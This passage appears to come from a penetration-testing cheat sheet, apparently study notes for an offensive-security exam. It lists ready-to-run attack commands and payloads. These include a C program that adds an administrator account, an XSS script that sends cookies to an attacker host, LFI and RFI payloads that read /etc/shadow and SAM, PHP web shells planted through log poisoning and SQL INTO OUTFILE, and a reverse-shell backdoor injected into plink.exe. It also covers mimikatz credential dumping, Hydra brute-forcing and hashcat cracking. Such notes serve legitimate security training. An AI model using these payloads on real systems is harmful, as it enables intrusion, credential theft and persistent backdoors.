+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat useradd.c  </span><br><span class="line">#include &lt;stdlib.h&gt; /* system, NULL, EXIT_FAILURE */  </span><br><span class="line">int main ()  </span><br><span class="line">&#123;  </span><br><span class="line">int i;  </span><br><span class="line">i=system (&quot;net localgroup administrators low /add&quot;);  </span><br><span class="line">return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c</code></p>
+</li>
+<li><p>Group Policy Preferences (GPP)<br>A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files</p>
+<ul>
+<li><p>map the Domain controller SYSVOL share<br><code>net use z:\\dc01\SYSVOL</code></p>
+</li>
+<li><p>Find the GPP file: Groups.xml<br><code>dir /s Groups.xml</code></p>
+</li>
+<li><p>Review the contents for passwords<br><code>type Groups.xml</code></p>
+</li>
+<li><p>Decrypt using GPP Decrypt<br><code>gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB</code></p>
+</li>
+</ul>
+</li>
+<li><p>Find and display the proof.txt or flag.txt - get the loot!<br><code>#meterpreter &gt; run post/windows/gather/win_privs</code><br><code>cd\ &amp; dir /b /s proof.txt</code><br><code>type c:\pathto\proof.txt</code></p>
+</li>
+</ul>
+<h2 id="Client-Web-and-Password-Attacks"><a href="#Client-Web-and-Password-Attacks" class="headerlink" title="Client, Web and Password Attacks"></a>Client, Web and Password Attacks</h2><h3 id="Client-Attacks"><a href="#Client-Attacks" class="headerlink" title="Client Attacks"></a>Client Attacks</h3><ul>
+<li><p>MS12-037- Internet Explorer 8 Fixed Col Span ID  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -O exploit.html [http://www.exploit-db.com/download/24017](http://web.archive.org/web/20171113221652/http://www.exploit-db.com/download/24017)  </span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>JAVA Signed Jar client side attack  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&#x27; &gt; /var/www/html/java.html  </span><br><span class="line">User must hit run on the popup that occurs.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Linux Client Shells<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/"><em>http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</em></a></p>
+</li>
+<li><p>Setting up the Client Side Exploit</p>
+</li>
+<li><p>Swapping Out the Shellcode</p>
+</li>
+<li><p>Injecting a Backdoor Shell into Plink.exe<br>backdoor-factory -f &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;plink.exe -H $ip -P 4444 -s reverse_shell_tcp</p>
+</li>
+</ul>
+<h3 id="Web-Attacks"><a href="#Web-Attacks" class="headerlink" title="Web Attacks"></a>Web Attacks</h3><ul>
+<li><p>Web Shag Web Application Vulnerability Assessment Platform<br>webshag-gui</p>
+</li>
+<li><p>Web Shells<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://tools.kali.org/maintaining-access/webshells"><em>http://tools.kali.org/maintaining-access/webshells</em></a><br><code>ls -l /usr/share/webshells/</code></p>
+</li>
+<li><p>Generate a PHP backdoor (generate) protected with the given password (s3cr3t)<br>weevely generate s3cr3t<br>weevely http:&#x2F;&#x2F;$ip&#x2F;weevely.php s3cr3t</p>
+</li>
+<li><p>Java Signed Applet Attack</p>
+</li>
+<li><p>HTTP &#x2F; HTTPS Webserver Enumeration</p>
+<ul>
+<li>OWASP Dirbuster</li>
+<li>nikto -h $ip</li>
+</ul>
+</li>
+<li><p>Essential Iceweasel Add-ons<br>Cookies Manager: <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/">https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/</a><br>Tamper Data: <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://addons.mozilla.org/en-US/firefox/addon/tamper-data/">https://addons.mozilla.org/en-US/firefox/addon/tamper-data/</a></p>
+</li>
+<li><p>Cross Site Scripting (XSS)<br>significant impacts, such as cookie stealing and authentication bypass, redirecting the victim’s browser to a malicious HTML page, and more</p>
+<ul>
+<li><p>Browser Redirection and IFRAME Injection</p>
+<div class="highlight highlight-text-html-basic">
+
+<pre><<span class="pl-ent">iframe</span> <span class="pl-e">SRC</span>=<span class="pl-s"><span class="pl-pds">"</span>http://$ip/report<span class="pl-pds">"</span></span> <span class="pl-e">height</span> = <span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span>></<span class="pl-ent">iframe</span>></pre>
+
+</div>
+</li>
+<li><p>Stealing Cookies and Session Information</p>
+<div class="highlight highlight-source-js">
+
+<pre><span class="pl-k"><</span>javascript<span class="pl-k">></span>  
+<span class="pl-k">new</span> <span class="pl-en">image</span>().<span class="pl-smi">src</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>http://$ip/bogus.php?output=<span class="pl-pds">"</span></span><span class="pl-k">+</span><span class="pl-c1">document</span>.<span class="pl-c1">cookie</span>;  
+<span class="pl-k"><</span><span class="pl-k">/</span>script<span class="pl-k">></span></pre>
+
+</div></li>
+</ul>
+<p><code>nc -nlvp 80</code></p>
+</li>
+</ul>
+<h3 id="File-Inclusion-Vulnerabilities"><a href="#File-Inclusion-Vulnerabilities" class="headerlink" title="File Inclusion Vulnerabilities"></a>File Inclusion Vulnerabilities</h3><ul>
+<li><p>Local (LFI) and remote (RFI) file inclusion vulnerabilities are commonly found in poorly written PHP code.</p>
+</li>
+<li><p>fimap - There is a Python tool called fimap which can be leveraged to automate the exploitation of LFI&#x2F;RFI vulnerabilities that are found in PHP (sqlmap for LFI):<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/kurobeats/fimap"><em>https://github.com/kurobeats/fimap</em></a></p>
+<ul>
+<li>Gaining a shell from phpinfo()<br>fimap + phpinfo() Exploit - If a phpinfo() file is present, it’s usually possible to get a shell, if you don’t know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster.</li>
+</ul>
+</li>
+<li><p>For Local File Inclusions look for the include() function in PHP code.</p>
+<div class="highlight highlight-text-html-php">
+
+<pre><span class="pl-s1"><span class="pl-k">include</span>(<span class="pl-s"><span class="pl-pds">"</span>lang/<span class="pl-pds">"</span></span><span class="pl-k">.</span><span class="pl-smi">$_COOKIE</span>[<span class="pl-s"><span class="pl-pds">'</span>lang<span class="pl-pds">'</span></span>]);</span> 
+<span class="pl-s1"><span class="pl-k">include</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>page<span class="pl-pds">'</span></span>]<span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">"</span>.php<span class="pl-pds">"</span></span>);</span></pre>
+
+</div>
+</li>
+<li><p>LFI - Encode and Decode a file using base64</p>
+<div class="highlight highlight-source-shell">
+
+<pre>curl -s \
+<span class="pl-s"><span class="pl-pds">"</span>http://<span class="pl-smi">$ip</span>/?page=php://filter/convert.base64-encode/resource=index<span class="pl-pds">"</span></span> \
+<span class="pl-k">|</span> grep -e <span class="pl-s"><span class="pl-pds">'</span>\[^\\ \]\\{40,\\}<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -d</pre>
+
+</div>
+</li>
+<li><p>LFI - Download file with base 64 encoding<br><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;admin.php</em></p>
+</li>
+<li><p>LFI Linux Files:<br>&#x2F;etc&#x2F;issue<br>&#x2F;proc&#x2F;version<br>&#x2F;etc&#x2F;profile<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;shadow<br>&#x2F;root&#x2F;.bash_history<br>&#x2F;var&#x2F;log&#x2F;dmessage<br>&#x2F;var&#x2F;mail&#x2F;root<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</p>
+</li>
+<li><p>LFI Windows Files:<br>%SYSTEMROOT%\repair\system<br>%SYSTEMROOT%\repair\SAM<br>%SYSTEMROOT%\repair\SAM<br>%WINDIR%\win.ini<br>%SYSTEMDRIVE%\boot.ini<br>%WINDIR%\Panther\sysprep.inf<br>%WINDIR%\system32\config\AppEvent.Evt</p>
+</li>
+<li><p>LFI OSX Files:<br>&#x2F;etc&#x2F;fstab<br>&#x2F;etc&#x2F;master.passwd<br>&#x2F;etc&#x2F;resolv.conf<br>&#x2F;etc&#x2F;sudoers<br>&#x2F;etc&#x2F;sysctl.conf</p>
+</li>
+<li><p>LFI - Download passwords file<br><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?page&#x3D;&#x2F;etc&#x2F;passwd</em><br><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</em></p>
+</li>
+<li><p>LFI - Download passwords file with filter evasion<br><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?file&#x3D;..%2F..%2F..%2F..%2Fetc%2Fpasswd</em></p>
+</li>
+<li><p>Local File Inclusion - In versions of PHP below 5.3 we can terminate with null byte<br>GET &#x2F;addguestbook.php?name&#x3D;Haxor&amp;comment&#x3D;Merci!&amp;LANG&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts%00</p>
+</li>
+<li><p>Contaminating Log Files <code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></p>
+</li>
+<li><p>For a Remote File Inclusion look for php code that is not sanitized and passed to the PHP include function and the php.ini file must be configured to allow remote files</p>
+<p><em>&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini</em> - “allow_url_fopen” and “allow_url_include” both set to “on”</p>
+<p><code>include($_REQUEST[&quot;file&quot;].&quot;.php&quot;);</code></p>
+</li>
+<li><p>Remote File Inclusion</p>
+<p><code>http://192.168.11.35/addguestbook.php?name=a&amp;comment=b&amp;LANG=http://192.168.10.5/evil.txt</code></p>
+<p><code>&lt;?php echo shell\_exec(&quot;ipconfig&quot;);?&gt;</code></p>
+</li>
+<li><h2 id="Database-Vulnerabilities"><a href="#Database-Vulnerabilities" class="headerlink" title="Database Vulnerabilities"></a>Database Vulnerabilities</h2><ul>
+<li>Playing with SQL Syntax A great tool I have found for playing with SQL Syntax for a variety of database types (MSSQL Server, MySql, PostGreSql, Oracle) is SQL Fiddle:</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://sqlfiddle.com/">http://sqlfiddle.com</a></p>
+<p>Another site is rextester.com:</p>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://rextester.com/l/mysql_online_compiler">http://rextester.com/l/mysql_online_compiler</a></p>
+<ul>
+<li><p>Detecting SQL Injection Vulnerabilities.</p>
+<p>Most modern automated scanner tools use time delay techniques to detect SQL injection vulnerabilities. This method can tell you if a SQL injection vulnerability is present even if it is a “blind” sql injection vulnerabilit that does not provide any data back. You know your SQL injection is working when the server takes a LOooooong time to respond. I have added a line comment at the end of each injection statement just in case there is additional SQL code after the injection point.</p>
+<ul>
+<li><p><strong>MSSQL Server SQL Injection Time Delay Detection:</strong> Add a 30 second delay to a MSSQL Server Query</p>
+<ul>
+<li><p><em>Original Query</em></p>
+<p><code>SELECT * FROM products WHERE name=&#39;Test&#39;;</code></p>
+</li>
+<li><p><em>Injection Value</em></p>
+<p><code>&#39;; WAITFOR DELAY &#39;00:00:30&#39;; --</code></p>
+</li>
+<li><p><em>Resulting Query</em></p>
+<p><code>SELECT * FROM products WHERE name=&#39;Test&#39;; WAITFOR DELAY &#39;00:00:30&#39;; --</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>MySQL Injection Time Delay Detection:</strong> Add a 30 second delay to a MySQL Query</p>
+<ul>
+<li><p><em>Original Query</em></p>
+<p><code>SELECT * FROM products WHERE name=&#39;Test&#39;;</code></p>
+</li>
+<li><p><em>Injection Value</em></p>
+<p><code>&#39;-SLEEP(30); #</code></p>
+</li>
+<li><p><em>Resulting Query</em></p>
+<p><code>SELECT * FROM products WHERE name=&#39;Test&#39;-SLEEP(30); #</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>PostGreSQL Injection Time Delay Detection:</strong> Add a 30 second delay to an PostGreSQL Query</p>
+<ul>
+<li><p><em>Original Query</em></p>
+<p><code>SELECT * FROM products WHERE name=&#39;Test&#39;;</code></p>
+</li>
+<li><p><em>Injection Value</em></p>
+<p><code>&#39;; SELECT pg_sleep(30); --</code></p>
+</li>
+<li><p><em>Resulting Query</em></p>
+<p><code>SELECT * FROM products WHERE name=&#39;Test&#39;; SELECT pg_sleep(30); --</code></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and password</p>
+<pre><code>  mysql -u root -p -h $ip
+  use &quot;Users&quot;  
+  show tables;  
+  select \* from users;
+</code></pre>
+</li>
+<li><p>Authentication Bypass</p>
+<pre><code>  name=&#39;wronguser&#39; or 1=1;  
+  name=&#39;wronguser&#39; or 1=1 LIMIT 1;
+</code></pre>
+</li>
+<li><p>Enumerating the Database</p>
+<p><code>http://192.168.11.35/comment.php?id=738)&#39;</code></p>
+<p>Verbose error message?</p>
+<p><code>http://$ip/comment.php?id=738 order by 1</code></p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6</code></p>
+<p>Determine MySQL Version:</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6</code></p>
+<p>Current user being used for the database connection:</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6</code></p>
+<p>Enumerate database tables and column structures</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables</code></p>
+<p>Target the users table in the database</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name=&#39;users&#39;</code></p>
+<p>Extract the name and password</p>
+<p><code>http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users</code></p>
+<p>Create a backdoor</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;c:/xampp/htdocs/backdoor.php&#39;</code></p>
+</li>
+<li><p><strong>SQLMap Examples</strong></p>
+</li>
+<li><p>Crawl the links</p>
+<p><code>sqlmap -u http://$ip --crawl=1</code></p>
+<p><code>sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3</code></p>
+</li>
+<li><p>SQLMap Search for databases against a suspected GET SQL Injection</p>
+<p><code>sqlmap –u http://$ip/blog/index.php?search –dbs</code></p>
+</li>
+<li><p>SQLMap dump tables from database oscommerce at GET SQL injection</p>
+<p><code>sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps</code></p>
+</li>
+<li><p>SQLMap GET Parameter command</p>
+<p><code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5</code></p>
+</li>
+<li><p>SQLMap Post Username parameter</p>
+<p><code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --dump-all</code></p>
+</li>
+<li><p>SQL Map OS Shell</p>
+<p><code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell</code></p>
+<p><code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --os-shell</code></p>
+</li>
+<li><p>Automated sqlmap scan</p>
+<p><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=&quot;/var/www/blah.php&quot;</code></p>
+</li>
+<li><p>Targeted sqlmap scan</p>
+<p><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump</code></p>
+</li>
+<li><p>Scan url for union + error based injection with mysql backend and use a random user agent + database dump</p>
+<p><code>sqlmap -o -u http://$ip/index.php --forms --dbs</code></p>
+<p><code>sqlmap -o -u &quot;http://$ip/form/&quot; --forms</code></p>
+</li>
+<li><p>Sqlmap check form for injection</p>
+<p><code>sqlmap -o -u &quot;http://$ip/vuln-form&quot; --forms -D database-name -T users --dump</code></p>
+</li>
+<li><p>Enumerate databases</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --dbs</code></p>
+</li>
+<li><p>Enumerate tables from a specific database</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --tables</code></p>
+</li>
+<li><p>Dump table data from a specific database and table</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; -T &quot;$TABLE&quot; --dump</code></p>
+</li>
+<li><p>Specify parameter to exploit</p>
+<p><code>sqlmap --dbms=mysql -u &quot;http://www.example.com/param1=value1&amp;param2=value2&quot; --dbs -p param2</code></p>
+</li>
+<li><p>Specify parameter to exploit in ‘nice’ URIs (exploits param1)</p>
+<p><code>sqlmap --dbms=mysql -u &quot;http://www.example.com/param1/value1*/param2/value2&quot; --dbs</code></p>
+</li>
+<li><p>Get OS shell</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --os-shell</code></p>
+</li>
+<li><p>Get SQL shell</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --sql-shell</code></p>
+</li>
+<li><p>SQL query</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --sql-query &quot;SELECT * FROM $TABLE;&quot;</code></p>
+</li>
+<li><p>Use Tor Socks5 proxy</p>
+<p><code>sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u &quot;$URL&quot; --dbs</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>NoSQLMap Examples</strong> You may encounter NoSQL instances like MongoDB in your journies (<code>/cgi-bin/mongo/2.2.3/dbparse.py</code>). NoSQLMap can help you to automate NoSQLDatabase enumeration.</p>
+</li>
+<li><p>NoSQLMap Installation</p>
+<div class="highlight highlight-source-shell">
+
+<pre>git clone https://github.com/codingo/NoSQLMap.git
+<span class="pl-c1">cd</span> NoSQLMap/
+ls
+pip install couchdb
+pip install pbkdf2
+pip install ipcalc
+python nosqlmap.py</pre>
+
+</div>
+</li>
+<li><p>Often you can create an exception dump message with MongoDB using a malformed NoSQLQuery such as:</p>
+<p>  <code>a&#39;; return this.a != &#39;BadData’&#39;; var dummy=&#39;!</code></p>
+</li>
+<li><h2 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h2><ul>
+<li><p>AES Decryption<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://aesencryption.net/">http://aesencryption.net/</a></p>
+</li>
+<li><p>Convert multiple webpages into a word list</p>
+<div class="highlight highlight-source-shell">
+
+<pre><span class="pl-k">for</span> <span class="pl-smi">x</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">'</span>index<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>about<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>post<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>contact<span class="pl-pds">'</span></span> <span class="pl-k">;</span> <span class="pl-k">do</span> \
+  curl http://<span class="pl-smi">$ip</span>/<span class="pl-smi">$x</span>.html <span class="pl-k">|</span> html2markdown <span class="pl-k">|</span> tr -s <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>\\n<span class="pl-pds">'</span></span> <span class="pl-k">>></span> webapp.txt <span class="pl-k">;</span> \
+<span class="pl-k">done</span></pre>
+
+</div>
+</li>
+<li><p>Or convert html to word list dict<br><code>html2dic index.html.out | sort -u &gt; index-html.dict</code></p>
+</li>
+<li><p>Default Usernames and Passwords</p>
+<ul>
+<li><p>CIRT<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.cirt.net/passwords"><em>http://www.cirt.net/passwords</em></a></p>
+</li>
+<li><p>Government Security - Default Logins and Passwords for Networked Devices</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php"><em>http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php</em></a></p>
+</li>
+<li><p>Virus.org<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.virus.org/default-password/"><em>http://www.virus.org/default-password/</em></a></p>
+</li>
+<li><p>Default Password<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.defaultpassword.com/"><em>http://www.defaultpassword.com/</em></a></p>
+</li>
+</ul>
+</li>
+<li><p>Brute Force</p>
+<ul>
+<li><p>Nmap Brute forcing Scripts<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/brute.html"><em>https://nmap.org/nsedoc/categories/brute.html</em></a></p>
+</li>
+<li><p>Nmap Generic auto detect brute force attack: <code>nmap --script brute -Pn &lt;target.com or ip&gt;</code></p>
+</li>
+<li><p>MySQL nmap brute force attack: <code>nmap --script=mysql-brute $ip</code></p>
+</li>
+</ul>
+</li>
+<li><p>Dictionary Files</p>
+<ul>
+<li>Word lists on Kali<br><code>cd /usr/share/wordlists</code></li>
+</ul>
+</li>
+<li><p>Key-space Brute Force</p>
+<ul>
+<li><p><code>crunch 6 6 0123456789ABCDEF -o crunch1.txt</code></p>
+</li>
+<li><p><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha</code></p>
+</li>
+<li><p><code>crunch 8 8 -t ,@@^^%%%</code></p>
+</li>
+</ul>
+</li>
+<li><p>Pwdump and Fgdump - Security Accounts Manager (SAM)</p>
+<ul>
+<li><p><code>pwdump.exe</code> - attempts to extract password hashes</p>
+</li>
+<li><p><code>fgdump.exe</code> - attempts to kill local antiviruses before attempting to dump the password hashes and cached credentials.</p>
+</li>
+</ul>
+</li>
+<li><p>Windows Credential Editor (WCE)</p>
+<ul>
+<li>allows one to perform several attacks to obtain clear text passwords and hashes. Usage: <code>wce -w</code></li>
+</ul>
+</li>
+<li><p>Mimikatz</p>
+<ul>
+<li><p>extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/gentilkiwi/mimikatz"><em>https://github.com/gentilkiwi/mimikatz</em></a> From metasploit meterpreter (must have System level access):</p>
+<pre><code>meterpreter&gt; load mimikatz
+meterpreter&gt; help mimikatz
+meterpreter&gt; msv
+meterpreter&gt; kerberos
+meterpreter&gt; mimikatz_command -f samdump::hashes
+meterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>Password Profiling</p>
+<ul>
+<li>cewl can generate a password list from a web page<br><code>cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt</code></li>
+</ul>
+</li>
+<li><p>Password Mutating</p>
+<ul>
+<li>John the ripper can mutate password lists<br>nano &#x2F;etc&#x2F;john&#x2F;john.conf<br><code>john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</code></li>
+</ul>
+</li>
+<li><p>Medusa</p>
+<ul>
+<li>Medusa, initiated against an htaccess protected web directory<br><code>medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10</code></li>
+</ul>
+</li>
+<li><p>Ncrack</p>
+<ul>
+<li>ncrack (from the makers of nmap) can brute force RDP<br><code>ncrack -vv --user offsec -P password-file.txt rdp://$ip</code></li>
+</ul>
+</li>
+<li><p>Hydra</p>
+<ul>
+<li><p>Hydra brute force against SNMP</p>
+<p><code>hydra -P password-file.txt -v $ip snmp</code></p>
+</li>
+<li><p>Hydra FTP known user and rockyou password list</p>
+<p><code>hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp</code></p>
+</li>
+<li><p>Hydra SSH using list of users and passwords</p>
+<p><code>hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh</code></p>
+</li>
+<li><p>Hydra SSH using a known password and a username list</p>
+<p><code>hydra -v -V -u -L users.txt -p &quot;&lt;known password&gt;&quot; -t 1 -u $ip ssh</code></p>
+</li>
+<li><p>Hydra SSH Against Known username on port 22</p>
+<p><code>hydra $ip -s 22 ssh -l &lt;user&gt; -P big_wordlist.txt</code></p>
+</li>
+<li><p>Hydra POP3 Brute Force</p>
+<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V</code></p>
+</li>
+<li><p>Hydra SMTP Brute Force</p>
+<p><code>hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V</code></p>
+</li>
+<li><p>Hydra attack http get 401 login with a dictionary</p>
+<p><code>hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin</code></p>
+</li>
+<li><p>Hydra attack Windows Remote Desktop with rockyou</p>
+<p><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></p>
+</li>
+<li><p>Hydra brute force SMB user with rockyou:</p>
+<p><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb</code></p>
+</li>
+<li><p>Hydra brute force a Wordpress admin login</p>
+<p><code>hydra -l admin -P ./passwordlist.txt $ip -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h2 id="Password-Hash-Attacks"><a href="#Password-Hash-Attacks" class="headerlink" title="Password Hash Attacks"></a>Password Hash Attacks</h2><ul>
+<li><p>Online Password Cracking<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://crackstation.net/"><em>https://crackstation.net/</em></a> <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://finder.insidepro.com/"><em>http://finder.insidepro.com/</em></a></p>
+</li>
+<li><p>Hashcat Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the –force parameter.</p>
+</li>
+</ul>
+<p><code>apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev</code></p>
+<p>and</p>
+<p><code>apt-get install pocl-opencl-icd</code></p>
+<p>Cracking Linux Hashes - &#x2F;etc&#x2F;shadow file</p>
+<pre><code> 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
+3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
+7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
+1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
+</code></pre>
+<p>Cracking Windows Hashes</p>
+<pre><code>3000 | LM                                               | Operating-Systems
+1000 | NTLM                                             | Operating-Systems
+</code></pre>
+<p>Cracking Common Application Hashes</p>
+<pre><code>  900 | MD4                                              | Raw Hash
+    0 | MD5                                              | Raw Hash
+ 5100 | Half MD5                                         | Raw Hash
+  100 | SHA1                                             | Raw Hash
+10800 | SHA-384                                          | Raw Hash
+ 1400 | SHA-256                                          | Raw Hash
+ 1700 | SHA-512                                          | Raw Hash
+</code></pre>
+<p>Create a .hash file with all the hashes you want to crack puthasheshere.hash: <code>$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/</code></p>
+<p>Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:</p>
+<p><code>hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></p>
+<p>Wordpress sample hash: <code>$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/</code></p>
+<p>Wordpress clear text: <code>test</code></p>
+<p>Hashcat example cracking Wordpress passwords using rockyou:</p>
+<p><code>hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt</code></p>
+<ul>
+<li><p>Sample Hashes<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://openwall.info/wiki/john/sample-hashes"><em>http://openwall.info/wiki/john/sample-hashes</em></a></p>
+</li>
+<li><p>Identify Hashes</p>
+<p><code>hash-identifier</code></p>
+</li>
+<li><p>To crack linux hashes you must first unshadow them:</p>
+<p><code>unshadow passwd-file.txt shadow-file.txt</code></p>
